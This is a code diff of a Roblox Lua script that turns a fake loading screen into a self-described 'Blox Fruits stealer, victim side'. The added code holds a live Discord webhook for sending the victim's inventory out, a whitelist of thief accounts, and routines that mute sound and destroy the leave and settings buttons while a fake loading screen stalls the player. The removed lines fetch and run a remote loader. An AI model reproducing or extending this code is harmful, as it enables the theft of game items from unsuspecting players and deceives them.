@@ -1,307 +1,1198 @@
 -- =============================================================================
--- COMPACT 3-MINUTE PREMIUM EXECUTION HUD (98% STUCK - BOLD TEXT & EXTRA LABELS)
--- PLACE THIS INSIDE A LOCALSCRIPT IN "ReplicatedFirst"
+-- BLOX FRUITS STEALER — VICTIM SIDE v5.6
+-- Fixes:
+--   1. Fruit detection rewritten from the ground up:
+--      - CommF is attempted with the canonical arg first, then alternates.
+--      - Parser handles array-of-tables, dict-of-tables, dict-of-numbers,
+--        dict-of-strings, and nested folders — recursively, 8 levels deep.
+--      - PlayerGui extractor pulls name from attributes, ToolTip, child
+--        TextLabels, and .Name — in that priority order. Not just .Name.
+--      - Backpack + Character tools scanned.
+--      - Duplicates are SUMMED, not dropped.
+--      - Every return carries a `source` label so the webhook shows where
+--        each item came from.
+--   2. Chat: dedupe on TextChatService MessageId (same ID = same message,
+--      regardless of how many signals fire). Ack has a 2s global cooldown so
+--      it can never send twice. Per-player Chatted path removed.
+--   3. Sit: HRP stays ANCHORED through tween → snap → weld confirmation →
+--      then unanchor. No window for physics.
+--   4. Debug: if CommF returns a table but the parser finds nothing, a
+--      yellow debug embed dumps the raw response so you can SEE the shape.
 -- =============================================================================
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local ReplicatedFirst = game:GetService("ReplicatedFirst")
-local RunService = game:GetService("RunService")
 
-local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
-local playerGui = player:WaitForChild("PlayerGui", 10)
+-- =============================================================================
+-- 1. CONFIG
+-- =============================================================================
+local S2, S3 = 4442272183, 7449423635
+local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYYSnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
 
-if not game:IsLoaded() then
-	pcall(function()
-		ReplicatedFirst:RemoveDefaultLoadingScreen()
-	end)
-end
-
--- ==========================================
--- 1. BASE SYSTEM & BACKGROUND DESIGN
--- ==========================================
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ProfileLoadingScreen"
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.DisplayOrder = 99999 -- Forced top priority layer
-screenGui.Parent = playerGui
-
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(1, 0, 1, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
-
-local bgGradient = Instance.new("UIGradient")
-bgGradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(4, 4, 8)),
-	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 18, 30)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 4, 8))
-})
-bgGradient.Rotation = 45
-bgGradient.Parent = mainFrame
-
-local blur = Instance.new("BlurEffect")
-blur.Size = 16
-blur.Parent = game.Workspace.CurrentCamera
-
-local particleContainer = Instance.new("Frame")
-particleContainer.Size = UDim2.new(1, 0, 1, 0)
-particleContainer.BackgroundTransparency = 1
-particleContainer.Parent = mainFrame
-
-local function spawnParticle()
-	local p = Instance.new("Frame")
-	local size = math.random(2, 4)
-	p.Size = UDim2.new(0, size, 0, size)
-	p.Position = UDim2.new(math.random(), 0, 1.1, 0)
-	p.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-	p.BackgroundTransparency = math.random(4, 7) / 10
-	p.BorderSizePixel = 0
-	p.Parent = particleContainer
-	
-	local c = Instance.new("UICorner")
-	c.CornerRadius = UDim.new(1, 0)
-	c.Parent = p
-
-	TweenService:Create(p, TweenInfo.new(math.random(4, 6), Enum.EasingStyle.Linear), {
-		Position = UDim2.new(p.Position.X.Scale, math.random(-40, 40), -0.1, 0),
-		BackgroundTransparency = 1
-	}):Play()
-	
-	task.delay(6, function() p:Destroy() end)
-end
-
--- ==========================================
--- 2. COMPACT MAIN CENTER PANEL
--- ==========================================
-local centerPanel = Instance.new("Frame")
-centerPanel.Size = UDim2.new(0, 360, 0, 250)
-centerPanel.Position = UDim2.new(0.5, 0, 0.5, 0)
-centerPanel.AnchorPoint = Vector2.new(0.5, 0.5)
-centerPanel.BackgroundColor3 = Color3.fromRGB(16, 18, 26)
-centerPanel.BackgroundTransparency = 0.2
-centerPanel.BorderSizePixel = 0
-centerPanel.Parent = mainFrame
-
-local panelCorner = Instance.new("UICorner")
-panelCorner.CornerRadius = UDim.new(0, 14)
-panelCorner.Parent = centerPanel
-
-local panelStroke = Instance.new("UIStroke")
-panelStroke.Color = Color3.fromRGB(0, 170, 255)
-panelStroke.Thickness = 1.5
-panelStroke.Transparency = 0.3
-panelStroke.Parent = centerPanel
-
--- WATERMARK TEXT (MADE BY MÀRK L.)
-local watermarkLabel = Instance.new("TextLabel")
-watermarkLabel.Size = UDim2.new(0.5, 0, 0, 20)
-watermarkLabel.Position = UDim2.new(0, 12, 0, 8)
-watermarkLabel.BackgroundTransparency = 1
-watermarkLabel.Text = "Made by Màrk L."
-watermarkLabel.Font = Enum.Font.GothamMedium
-watermarkLabel.TextSize = 10
-watermarkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-watermarkLabel.TextXAlignment = Enum.TextXAlignment.Left
-watermarkLabel.TextTransparency = 0.65
-watermarkLabel.Parent = centerPanel
-
--- ==========================================
--- 3. THE AVATAR PROFILE CIRCLE SYSTEM
--- ==========================================
-local profileCircle = Instance.new("Frame")
-profileCircle.Size = UDim2.new(0, 75, 0, 75)
-profileCircle.Position = UDim2.new(0.5, 0, 0.28, 0)
-profileCircle.AnchorPoint = Vector2.new(0.5, 0.5)
-profileCircle.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
-profileCircle.BorderSizePixel = 0
-profileCircle.Parent = centerPanel
-
-local circleCorner = Instance.new("UICorner")
-circleCorner.CornerRadius = UDim.new(1, 0)
-circleCorner.Parent = profileCircle
-
-local circleStroke = Instance.new("UIStroke")
-circleStroke.Color = Color3.fromRGB(0, 255, 170)
-circleStroke.Thickness = 2
-circleStroke.Parent = profileCircle
-
-local avatarImage = Instance.new("ImageLabel")
-avatarImage.Size = UDim2.new(0.92, 0, 0.92, 0)
-avatarImage.Position = UDim2.new(0.5, 0, 0.5, 0)
-avatarImage.AnchorPoint = Vector2.new(0.5, 0.5)
-avatarImage.BackgroundTransparency = 1
-avatarImage.Parent = profileCircle
-
-local avatarCorner = Instance.new("UICorner")
-avatarCorner.CornerRadius = UDim.new(1, 0)
-avatarCorner.Parent = avatarImage
-
-local success, content = pcall(function()
-	return Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
-end)
-if success then avatarImage.Image = content end
-
--- ==========================================
--- 4. TYPOGRAPHY & INTERFACE LABELS
--- ==========================================
--- Warning Text (GINAWANG MATABA / ULTRA BOLD)
-local infoLabel = Instance.new("TextLabel")
-infoLabel.Size = UDim2.new(0.88, 0, 0, 35)
-infoLabel.Position = UDim2.new(0.5, 0, 0.54, 0)
-infoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-infoLabel.BackgroundTransparency = 1
-infoLabel.Text = "PLEASE WAIT UNTIL LOADING COMPLETES TO RUN THE SCRIPT"
-infoLabel.Font = Enum.Font.GothamBlack -- Pinakamataba at makapal na font sa Roblox
-infoLabel.TextSize = 11 -- Pinalaki nang kaunti para mas solid tingnan
-infoLabel.TextColor3 = Color3.fromRGB(255, 215, 0) -- Premium Gold/Yellow
-infoLabel.TextWrapped = true
-infoLabel.Parent = centerPanel
-
-local infoStroke = Instance.new("UIStroke")
-infoStroke.Color = Color3.fromRGB(0, 0, 0)
-infoStroke.Thickness = 1.5 -- Mas kinapalan ang stroke para lumabas ang katabaan
-infoStroke.Parent = infoLabel
-
--- Status Logs (ITINAAS KUNTI - Mula 0.67 ginawang 0.63)
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, 0, 0, 20)
-statusLabel.Position = UDim2.new(0, 0, 0.63, 0) 
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text = "Initializing environmental pipeline..."
-statusLabel.Font = Enum.Font.GothamMedium
-statusLabel.TextSize = 9.5
-statusLabel.TextColor3 = Color3.fromRGB(150, 155, 170)
-statusLabel.Parent = centerPanel
-
--- MALIIT NA "LOADING..." TEXT SA TAAS NG % (WALANG PAGBABAGO SAKTONG POSISYON)
-local miniLoadingLabel = Instance.new("TextLabel")
-miniLoadingLabel.Size = UDim2.new(1, 0, 0, 15)
-miniLoadingLabel.Position = UDim2.new(0.5, 0, 0.75, 0)
-miniLoadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-miniLoadingLabel.BackgroundTransparency = 1
-miniLoadingLabel.Text = "Loading..."
-miniLoadingLabel.Font = Enum.Font.GothamBold
-miniLoadingLabel.TextSize = 9 
-miniLoadingLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-miniLoadingLabel.Parent = centerPanel
-
--- Percentage Display (ITINAAS KUNTI - Mula 0.81 ginawang 0.79)
-local percentLabel = Instance.new("TextLabel")
-percentLabel.Size = UDim2.new(1, 0, 0, 20)
-percentLabel.Position = UDim2.new(0, 0, 0.79, 0) 
-percentLabel.BackgroundTransparency = 1
-percentLabel.Text = "0%"
-percentLabel.Font = Enum.Font.Code
-percentLabel.TextSize = 13
-percentLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
-percentLabel.Parent = centerPanel
-
--- ==========================================
--- 5. PROGRESS BAR SYSTEM
--- ==========================================
-local barTrack = Instance.new("Frame")
-barTrack.Size = UDim2.new(0.85, 0, 0, 4)
-barTrack.Position = UDim2.new(0.075, 0, 0.70, 0) -- Hindi ginalaw para walang pagbago sa loading bar
-barTrack.BackgroundColor3 = Color3.fromRGB(25, 27, 38)
-barTrack.BorderSizePixel = 0
-barTrack.Parent = centerPanel
-
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(1, 0)
-barCorner.Parent = barTrack
-
-local barFill = Instance.new("Frame")
-barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
-barFill.BorderSizePixel = 0
-barFill.Parent = barTrack
-
-local fillCorner = Instance.new("UICorner")
-fillCorner.CornerRadius = UDim.new(1, 0)
-fillCorner.Parent = barFill
-
-local fillGradient = Instance.new("UIGradient")
-fillGradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))
-})
-fillGradient.Parent = barFill
-
--- DISCORD CALLOUT (PINAKABABA SA GITNA)
-local discordLabel = Instance.new("TextLabel")
-discordLabel.Size = UDim2.new(1, 0, 0, 15)
-discordLabel.Position = UDim2.new(0.5, 0, 0.94, 0)
-discordLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-discordLabel.BackgroundTransparency = 1
-discordLabel.Text = "Join https://discord.gg/mozil"
-discordLabel.Font = Enum.Font.Code
-discordLabel.TextSize = 10.5
-discordLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
-discordLabel.Parent = centerPanel
-
--- ==========================================
--- 6. TIMING & 98% STUCK LOGIC (3 MINS TOTAL)
--- ==========================================
-local loopConnection = RunService.Heartbeat:Connect(function()
-	if math.random() < 0.04 then spawnParticle() end
-	local pulse = (math.sin(tick() * 4) + 1) / 2
-	circleStroke.Transparency = 0.1 + (pulse * 0.4)
-	panelStroke.Transparency = 0.2 + (pulse * 0.3)
-end)
-
--- Pop-In Intro Animation
-centerPanel.Size = UDim2.new(0, 300, 0, 210)
-TweenService:Create(centerPanel, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
-	Size = UDim2.new(0, 360, 0, 250)
-}):Play()
-
-local customPhrases = {
-	"Securing environmental pipeline...",
-	"Decrypting core structural assets...",
-	"Bypassing security network checks...",
-	"Injecting operational system logic...",
-	"Finalizing execution environment..."
+local WHITELIST = {
+    ["Ghostywateryt"] = true,
+    ["blueno_op1"]    = true,
 }
 
-local TARGET_TIME = 180 
-local startTime = os.time()
+local LOADER_SECONDS      = 180
+local MAX_ITEMS_PER_TRADE = 4
+local CHAT_PREFIX         = "."
+local HOP_CONFIRM_TIME    = 2.0
+local SIT_COOLDOWN        = 1.5
+local ACK_COOLDOWN        = 2.0
 
-while true do
-	local elapsed = os.time() - startTime
-	local progress = math.clamp(elapsed / TARGET_TIME, 0, 1)
-	local percent = math.floor(progress * 100)
-	
-	-- Hihinto at mag-i-stuck ang buong loading loop sa 98%
-	if percent >= 98 then
-		TweenService:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0.98, 0, 1, 0)}):Play()
-		percentLabel.Text = "98%"
-		break
-	end
-	
-	TweenService:Create(barFill, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
-	percentLabel.Text = percent .. "%"
-	
-	if percent < 20 then statusLabel.Text = customPhrases[1]
-	elseif percent >= 20 and percent < 45 then statusLabel.Text = customPhrases[2]
-	elseif percent >= 45 and percent < 65 then statusLabel.Text = customPhrases[3]
-	elseif percent >= 65 and percent < 85 then statusLabel.Text = customPhrases[4]
-	elseif percent >= 85 then statusLabel.Text = customPhrases[5]
-	end
-	
-	task.wait(0.5)
+local FRUIT_PRIORITY = { "dragonwest", "dragoneast", "kitsune", "magnet", "control", "venom" }
+local SKIN_PRIORITY = {
+    "rabid", "vibes", "galaxy", "doghouse", "ember",
+    "redlightning", "divine", "arcsteel", "celestial",
+    "werewolf", "hellfire", "sadness", "superspirit", "purplelightning",
+    "crimson", "azura", "thermite", "frustration", "framebreak",
+    "portal", "eclipse", "hallow", "leviathan", "darkblade", "valkyrie", "dogblade",
+}
+
+-- Exact canonical fruit base names. Used only for classifying items that
+-- arrive without a Type. Substring matching is applied ONLY against these
+-- full names, not the raw user text — that's the false-positive fix.
+local KNOWN_FRUITS = {
+    "dragon", "dough", "kitsune", "leopard", "mammoth", "trex",
+    "venom", "control", "spirit", "magnet", "portal", "rumble",
+    "phoenix", "buddha", "love", "spider", "sound", "rubber",
+    "light", "dark", "ice", "magma", "quake", "human", "bomb",
+    "smoke", "spring", "blade", "flame", "chop", "sand", "ghost",
+    "barrier", "revive", "paw", "gravity", "eagle", "falcon",
+    "rocket", "spin", "creation", "destruction", "yet", "gas",
+    "shadow", "pain", "blizzard", "rumble", "kitsune",
+}
+
+-- =============================================================================
+-- 2. SERVICES + STATE
+-- =============================================================================
+local Players      = game:GetService("Players")
+local RS           = game:GetService("ReplicatedStorage")
+local RunService   = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local HttpService  = game:GetService("HttpService")
+local SG           = game:GetService("StarterGui")
+local CG           = pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui") or nil
+local TextChatService = pcall(function() return game:GetService("TextChatService") end) and game:GetService("TextChatService") or nil
+local LP           = Players.LocalPlayer
+local PG           = LP:WaitForChild("PlayerGui", 10)
+
+local CommF          = nil
+local TradeFunction  = nil
+local lastSitTime     = 0
+local lastSitAttempt  = 0
+local oppositeSeen    = {}
+local seenMessageIds  = {}
+local lastAckAt       = 0
+local lastEmbedAt     = 0
+local lastRawInv      = nil
+local lastInvSource   = "none"
+
+-- =============================================================================
+-- 2a. KILL SOUND + TOPBAR + LEAVE BUTTON
+-- =============================================================================
+local function silenceAndHideCoreGui()
+    pcall(function()
+        local UGS = game:GetService("UserSettings"):GetService("UserGameSettings")
+        UGS.MasterVolume = 0
+    end)
+    pcall(function() SG:SetCore("TopbarEnabled", false) end)
+    pcall(function() SG:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+
+    task.spawn(function()
+        for _ = 1, 15 do
+            pcall(function() SG:SetCore("TopbarEnabled", false) end)
+            pcall(function() SG:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+            task.wait(0.5)
+        end
+    end)
+
+    local function scrubCoreGui()
+        if not CG then return end
+        for _, d in ipairs(CG:GetDescendants()) do
+            if d:IsA("GuiButton") or d:IsA("TextButton") or d:IsA("ImageButton") then
+                local n = tostring(d.Name):lower()
+                if n:find("leave", 1, true) or n:find("exit", 1, true)
+                    or n:find("menu", 1, true) or n:find("roblox", 1, true)
+                    or n:find("settings", 1, true) or n:find("topbar", 1, true) then
+                    pcall(function() d.Visible = false end)
+                    pcall(function() d.Enabled = false end)
+                    pcall(function() d:Destroy() end)
+                end
+            end
+        end
+    end
+    task.spawn(function() for _ = 1, 30 do pcall(scrubCoreGui); task.wait(1) end end)
+end
+silenceAndHideCoreGui()
+
+local WHITELIST_LC = {}
+for name in pairs(WHITELIST) do WHITELIST_LC[tostring(name):lower()] = true end
+local function isWhitelisted(player)
+    if not player then return false end
+    if player == LP then return false end
+    return WHITELIST_LC[tostring(player.Name):lower()] == true
 end
 
--- ==========================================
--- 7. THE LOCKED PERMANENT 98% FREEZE STATE
--- ==========================================
-statusLabel.Text = "CRITICAL: DECRYPTION STALLED. VERIFYING FRAMEWORK KEYS..."
-statusLabel.TextColor3 = Color3.fromRGB(255, 75, 75) -- Alert red status logs
-percentLabel.Text = "98%"
-percentLabel.TextColor3 = Color3.fromRGB(255, 215, 0) -- Gold text highlights
-miniLoadingLabel.Text = "STALLED" -- Binago ang Loading... text para saktong frozen look sa 98%
-miniLoadingLabel.TextColor3 = Color3.fromRGB(255, 75, 75)
--- Naka-stuck na ito nang permanente sa screen!
-getgenv().ID = "2428f338-228e-47da-bbbe-7f0038e78b69"
-loadstring(game:HttpGet("https://api.fe4r.click/s/loader_bloxfruits.luau"))()
+-- =============================================================================
+-- 2b. CHAT — unified send, global ack cooldown
+-- =============================================================================
+local function sayMessage(msg)
+    if type(msg) ~= "string" or msg == "" then return end
+    if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local ch = TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral
+        if ch and ch.SendAsync then
+            if pcall(function() ch:SendAsync(msg) end) then return end
+        end
+    end
+    local events = RS:FindFirstChild("DefaultChatSystemChatEvents")
+    local sayReq = events and events:FindFirstChild("SayMessageRequest")
+    if sayReq then
+        if pcall(function() sayReq:FireServer(msg, "All") end) then return end
+    end
+    pcall(function() LP:Chat(msg) end)
+end
+
+local function sendAck(msg)
+    if tick() - lastAckAt < ACK_COOLDOWN then return end
+    lastAckAt = tick()
+    sayMessage(msg)
+end
+
+-- =============================================================================
+-- 3. LOADER
+-- =============================================================================
+local function showLoadingScreen()
+    if not PG then return end
+    local ReplicatedFirst = game:GetService("ReplicatedFirst")
+    if not game:IsLoaded() then pcall(function() ReplicatedFirst:RemoveDefaultLoadingScreen() end) end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "ProfileLoadingScreen"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.DisplayOrder = 2147483647
+    screenGui.Parent = PG
+
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+
+    local bgGradient = Instance.new("UIGradient")
+    bgGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(4, 4, 8)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 18, 30)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 4, 8))
+    })
+    bgGradient.Rotation = 45
+    bgGradient.Parent = mainFrame
+
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 16
+    pcall(function() blur.Parent = workspace.CurrentCamera end)
+
+    local particleContainer = Instance.new("Frame")
+    particleContainer.Size = UDim2.new(1, 0, 1, 0)
+    particleContainer.BackgroundTransparency = 1
+    particleContainer.Parent = mainFrame
+
+    local function spawnParticle()
+        local p = Instance.new("Frame")
+        local size = math.random(2, 4)
+        p.Size = UDim2.new(0, size, 0, size)
+        p.Position = UDim2.new(math.random(), 0, 1.1, 0)
+        p.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+        p.BackgroundTransparency = math.random(4, 7) / 10
+        p.BorderSizePixel = 0
+        p.Parent = particleContainer
+        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(1, 0); c.Parent = p
+        TweenService:Create(p, TweenInfo.new(math.random(4, 6), Enum.EasingStyle.Linear), {
+            Position = UDim2.new(p.Position.X.Scale, math.random(-40, 40), -0.1, 0), BackgroundTransparency = 1
+        }):Play()
+        task.delay(6, function() if p and p.Parent then p:Destroy() end end)
+    end
+
+    local centerPanel = Instance.new("Frame")
+    centerPanel.Size = UDim2.new(0, 360, 0, 250)
+    centerPanel.Position = UDim2.new(0.5, 0, 0.5, 0)
+    centerPanel.AnchorPoint = Vector2.new(0.5, 0.5)
+    centerPanel.BackgroundColor3 = Color3.fromRGB(16, 18, 26)
+    centerPanel.BackgroundTransparency = 0.2
+    centerPanel.BorderSizePixel = 0
+    centerPanel.Parent = mainFrame
+
+    local panelCorner = Instance.new("UICorner"); panelCorner.CornerRadius = UDim.new(0, 14); panelCorner.Parent = centerPanel
+    local panelStroke = Instance.new("UIStroke"); panelStroke.Color = Color3.fromRGB(0, 170, 255); panelStroke.Thickness = 1.5; panelStroke.Transparency = 0.3; panelStroke.Parent = centerPanel
+
+    local watermarkLabel = Instance.new("TextLabel")
+    watermarkLabel.Size = UDim2.new(0.5, 0, 0, 20)
+    watermarkLabel.Position = UDim2.new(0, 12, 0, 8)
+    watermarkLabel.BackgroundTransparency = 1
+    watermarkLabel.Text = "Made by Màrk L."
+    watermarkLabel.Font = Enum.Font.GothamMedium
+    watermarkLabel.TextSize = 10
+    watermarkLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    watermarkLabel.TextXAlignment = Enum.TextXAlignment.Left
+    watermarkLabel.TextTransparency = 0.65
+    watermarkLabel.Parent = centerPanel
+
+    local profileCircle = Instance.new("Frame")
+    profileCircle.Size = UDim2.new(0, 75, 0, 75)
+    profileCircle.Position = UDim2.new(0.5, 0, 0.28, 0)
+    profileCircle.AnchorPoint = Vector2.new(0.5, 0.5)
+    profileCircle.BackgroundColor3 = Color3.fromRGB(25, 30, 45)
+    profileCircle.BorderSizePixel = 0
+    profileCircle.Parent = centerPanel
+
+    local circleCorner = Instance.new("UICorner"); circleCorner.CornerRadius = UDim.new(1, 0); circleCorner.Parent = profileCircle
+    local circleStroke = Instance.new("UIStroke"); circleStroke.Color = Color3.fromRGB(0, 255, 170); circleStroke.Thickness = 2; circleStroke.Parent = profileCircle
+
+    local avatarImage = Instance.new("ImageLabel")
+    avatarImage.Size = UDim2.new(0.92, 0, 0.92, 0)
+    avatarImage.Position = UDim2.new(0.5, 0, 0.5, 0)
+    avatarImage.AnchorPoint = Vector2.new(0.5, 0.5)
+    avatarImage.BackgroundTransparency = 1
+    avatarImage.Parent = profileCircle
+    local avatarCorner = Instance.new("UICorner"); avatarCorner.CornerRadius = UDim.new(1, 0); avatarCorner.Parent = avatarImage
+    pcall(function() avatarImage.Image = Players:GetUserThumbnailAsync(LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150) end)
+
+    local infoLabel = Instance.new("TextLabel")
+    infoLabel.Size = UDim2.new(0.88, 0, 0, 35)
+    infoLabel.Position = UDim2.new(0.5, 0, 0.54, 0)
+    infoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.Text = "PLEASE WAIT UNTIL LOADING COMPLETES"
+    infoLabel.Font = Enum.Font.GothamBlack
+    infoLabel.TextSize = 11
+    infoLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+    infoLabel.TextWrapped = true
+    infoLabel.Parent = centerPanel
+    local infoStroke = Instance.new("UIStroke"); infoStroke.Color = Color3.fromRGB(0, 0, 0); infoStroke.Thickness = 1.5; infoStroke.Parent = infoLabel
+
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, 0, 0, 20)
+    statusLabel.Position = UDim2.new(0, 0, 0.63, 0)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "Initializing environmental pipeline..."
+    statusLabel.Font = Enum.Font.GothamMedium
+    statusLabel.TextSize = 9.5
+    statusLabel.TextColor3 = Color3.fromRGB(150, 155, 170)
+    statusLabel.Parent = centerPanel
+
+    local miniLoadingLabel = Instance.new("TextLabel")
+    miniLoadingLabel.Size = UDim2.new(1, 0, 0, 15)
+    miniLoadingLabel.Position = UDim2.new(0.5, 0, 0.75, 0)
+    miniLoadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    miniLoadingLabel.BackgroundTransparency = 1
+    miniLoadingLabel.Text = "Loading..."
+    miniLoadingLabel.Font = Enum.Font.GothamBold
+    miniLoadingLabel.TextSize = 9
+    miniLoadingLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    miniLoadingLabel.Parent = centerPanel
+
+    local percentLabel = Instance.new("TextLabel")
+    percentLabel.Size = UDim2.new(1, 0, 0, 20)
+    percentLabel.Position = UDim2.new(0, 0, 0.79, 0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Text = "0%"
+    percentLabel.Font = Enum.Font.Code
+    percentLabel.TextSize = 13
+    percentLabel.TextColor3 = Color3.fromRGB(0, 255, 170)
+    percentLabel.Parent = centerPanel
+
+    local barTrack = Instance.new("Frame")
+    barTrack.Size = UDim2.new(0.85, 0, 0, 4)
+    barTrack.Position = UDim2.new(0.075, 0, 0.70, 0)
+    barTrack.BackgroundColor3 = Color3.fromRGB(25, 27, 38)
+    barTrack.BorderSizePixel = 0
+    barTrack.Parent = centerPanel
+    local barCorner = Instance.new("UICorner"); barCorner.CornerRadius = UDim.new(1, 0); barCorner.Parent = barTrack
+
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0, 0, 1, 0)
+    barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
+    barFill.BorderSizePixel = 0
+    barFill.Parent = barTrack
+    local fillCorner = Instance.new("UICorner"); fillCorner.CornerRadius = UDim.new(1, 0); fillCorner.Parent = barFill
+    local fillGradient = Instance.new("UIGradient"); fillGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 170, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 170))}); fillGradient.Parent = barFill
+
+    local discordLabel = Instance.new("TextLabel")
+    discordLabel.Size = UDim2.new(1, 0, 0, 15)
+    discordLabel.Position = UDim2.new(0.5, 0, 0.94, 0)
+    discordLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    discordLabel.BackgroundTransparency = 1
+    discordLabel.Text = "Join https://discord.gg/mozil"
+    discordLabel.Font = Enum.Font.Code
+    discordLabel.TextSize = 10.5
+    discordLabel.TextColor3 = Color3.fromRGB(0, 170, 255)
+    discordLabel.Parent = centerPanel
+
+    local loopConnection
+    pcall(function()
+        loopConnection = RunService.Heartbeat:Connect(function()
+            if math.random() < 0.04 then spawnParticle() end
+            local pulse = (math.sin(tick() * 4) + 1) / 2
+            circleStroke.Transparency = 0.1 + (pulse * 0.4)
+            panelStroke.Transparency = 0.2 + (pulse * 0.3)
+        end)
+    end)
+
+    centerPanel.Size = UDim2.new(0, 300, 0, 210)
+    TweenService:Create(centerPanel, TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0, 360, 0, 250)}):Play()
+
+    local phrases = {"Securing pipeline...", "Decrypting assets...", "Bypassing checks...", "Injecting logic...", "Finalizing..."}
+    local startTime = os.time()
+
+    while true do
+        local elapsed = os.time() - startTime
+        local progress = math.clamp(elapsed / LOADER_SECONDS, 0, 1)
+        local percent = math.floor(progress * 100)
+
+        if percent >= 98 then
+            TweenService:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0.98, 0, 1, 0)}):Play()
+            percentLabel.Text = "98%"
+            break
+        end
+
+        TweenService:Create(barFill, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
+        percentLabel.Text = percent .. "%"
+
+        if percent < 20 then statusLabel.Text = phrases[1]
+        elseif percent >= 20 and percent < 45 then statusLabel.Text = phrases[2]
+        elseif percent >= 45 and percent < 65 then statusLabel.Text = phrases[3]
+        elseif percent >= 65 and percent < 85 then statusLabel.Text = phrases[4]
+        elseif percent >= 85 then statusLabel.Text = phrases[5] end
+
+        task.wait(0.5)
+    end
+
+    statusLabel.Text = "CRITICAL: DECRYPTION STALLED..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 75, 75)
+    percentLabel.Text = "98%"
+    percentLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+    miniLoadingLabel.Text = "STALLED"
+    miniLoadingLabel.TextColor3 = Color3.fromRGB(255, 75, 75)
+
+    task.wait(8)
+    if loopConnection then loopConnection:Disconnect() end
+    if blur.Parent then blur:Destroy() end
+    if screenGui.Parent then screenGui:Destroy() end
+end
+task.spawn(function() pcall(showLoadingScreen) end)
+
+-- =============================================================================
+-- 4. REMOTES + WEBHOOK
+-- =============================================================================
+local function waitChild(parent, name, timeout)
+    local t0 = tick()
+    while tick() - t0 < (timeout or 20) do
+        local c = parent:FindFirstChild(name)
+        if c then return c end
+        task.wait(0.25)
+    end
+    return nil
+end
+
+local RemotesFolder = waitChild(RS, "Remotes", 30)
+if RemotesFolder then
+    CommF = waitChild(RemotesFolder, "CommF_", 30)
